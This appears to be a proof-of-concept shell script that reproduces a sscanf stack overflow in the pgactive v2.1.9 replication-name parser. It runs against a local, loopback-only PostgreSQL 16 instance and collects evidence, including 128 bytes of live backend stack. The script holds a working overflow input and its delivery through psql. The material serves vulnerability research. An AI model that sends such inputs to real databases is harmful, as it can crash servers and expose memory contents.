#!/bin/sh
# Read chosen bytes at chosen offsets from a LIVE PostgreSQL backend after the
# verbatim v2.1.9 sscanf overflow, before elog(ERROR) longjmps. gdb attach is
# unavailable here (/proc/sys/kernel/yama/ptrace_scope = 1), so the capture is
# copied inside the function under LIVE_CAPTURE; the verbatim builds used for
# the ASan/write claim do not define that macro. Loopback only.
set -u
cd "$(dirname "$0")" || exit 1
PGBIN=${PGBIN:-/tmp/pgactive-build/pg16root/usr/lib/postgresql/16/bin}
PGINC=${PGINC:-/tmp/pgactive-build/pg16root/usr/include/postgresql/16/server}
PORT=${PORT:-58420}
ROOT=${PWD}
PGDATA=${ROOT}/pgdata-live
SOCK=${ROOT}/sock-live
mkdir -p evidence "$SOCK"
rm -rf "$PGDATA" evidence/live-* evidence/live-pgstart.log evidence/live-pgstop.log

gcc -O0 -g -fPIC -DLIVE_CAPTURE -fstack-protector-strong -shared -I"$PGINC" \
    parser.c -o parser-live.so 2>evidence/live-build.log
echo "LIVE_BUILD=$?"
[ -f parser-live.so ] || exit 1

"$PGBIN/initdb" -D "$PGDATA" -A trust --no-sync --no-instructions \
    >evidence/live-initdb.log 2>&1
echo "LIVE_INITDB=$?"
"$PGBIN/pg_ctl" -D "$PGDATA" -l "$ROOT/evidence/live-server.log" -w start \
    -o "-p $PORT -k $SOCK -c listen_addresses=127.0.0.1" \
    >evidence/live-pgstart.log 2>&1
echo "LIVE_PGSTART=$?"
PSQL="$PGBIN/psql -h $SOCK -p $PORT -d postgres -X -q -A -t"

$PSQL -v libdir="$ROOT/parser-live.so" -f setup-live.sql \
    >evidence/live-setup.out 2>&1
echo "LIVE_SETUP=$?"

ATTACK="pgactive_123_1_2_3_$(printf 'AZ%.0s' $(seq 1 80))"
echo "$ATTACK" >evidence/live-attack-name.txt

printf "%s\n" \
  "SELECT pgactive_live_capture_reset();" \
  "SELECT * FROM pgactive_parse_replident_name('pgactive_123_1_2_3_');" \
  "SELECT encode(pgactive_live_capture_bytes(),'hex');" \
  >evidence/live-safe-session.sql
$PSQL -f evidence/live-safe-session.sql >evidence/live-safe.out 2>&1

printf "%s\n" \
  "SELECT pgactive_live_capture_reset();" \
  "SELECT * FROM pgactive_parse_replident_name('$ATTACK');" \
  "SELECT encode(pgactive_live_capture_bytes(),'hex');" \
  >evidence/live-attack-session.sql
$PSQL -f evidence/live-attack-session.sql >evidence/live-attack.out 2>&1
echo "LIVE_ATTACK_PSQL_RC=$?"

"$PGBIN/pg_ctl" -D "$PGDATA" -m fast -w stop >evidence/live-pgstop.log 2>&1
echo "LIVE_PGSTOP=$?"
echo '--- live session output (128-byte hex from live backend stack) ---'
cat evidence/live-attack.out
